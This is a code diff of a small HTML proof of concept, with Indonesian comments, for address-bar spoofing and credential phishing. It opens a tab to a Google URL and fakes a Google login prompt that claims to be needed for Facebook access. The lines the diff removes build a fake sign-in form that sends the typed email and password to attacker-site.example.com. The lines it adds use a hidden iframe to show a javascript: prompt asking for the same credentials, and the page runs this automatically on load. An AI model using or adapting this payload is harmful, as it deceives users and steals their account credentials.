@@ -1,45 +1,23 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Spoof Test</title>
-  </head>
   <body>
     <button onclick="spoof()">Click to spoof</button>
 
     <script>
       function spoof() {
-        // 1. Buka tab baru ke domain target (akan kelihatan seperti google.com:1234)
+        // 1. Buka tab baru ke domain target (untuk spoof address bar)
         let win = window.open("https://www.google.com:1234", "_blank");
 
-        // 2. Tunggu 3 detik lalu ganti isi halaman dengan form palsu
+        // 2. Tunggu 2 detik sebelum menampilkan prompt palsu
         setTimeout(() => {
-          const fakeLogin = `
-            <div style="font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;">
-              <h3 style="margin-bottom:10px;">Sign in with your Google Account</h3>
-              <p style="text-align:center;margin-bottom:20px;">To access Facebook.com, please log in with your Google account.</p>
-              <input id="email" type="email" placeholder="Email" style="margin:5px;padding:10px;width:250px;" />
-              <input id="pass" type="password" placeholder="Password" style="margin:5px;padding:10px;width:250px;" />
-              <button onclick="sendCreds()" style="margin-top:15px;padding:10px 20px;">Sign In</button>
-              <script>
-                function sendCreds() {
-                  let email = document.getElementById('email').value;
-                  let pass = document.getElementById('pass').value;
-                  fetch('https://attacker-site.example.com/log', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ email, pass })
-                  });
-                  alert("Logging in...");
-                }
-              <\/script>
-            </div>
-          `;
-
-          win.document.write(fakeLogin);
+          document.getElementById("iframe").src =
+            'javascript:prompt("In order to access Facebook.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
         }, 3000);
       }
 
-      // spoof(); // Uncomment jika ingin otomatis jalan tanpa klik
+      spoof(); // Auto-run saat halaman dibuka
     </script>
+
+    <iframe id="iframe" style="display:none;" src=""></iframe>
   </body>
 </html>
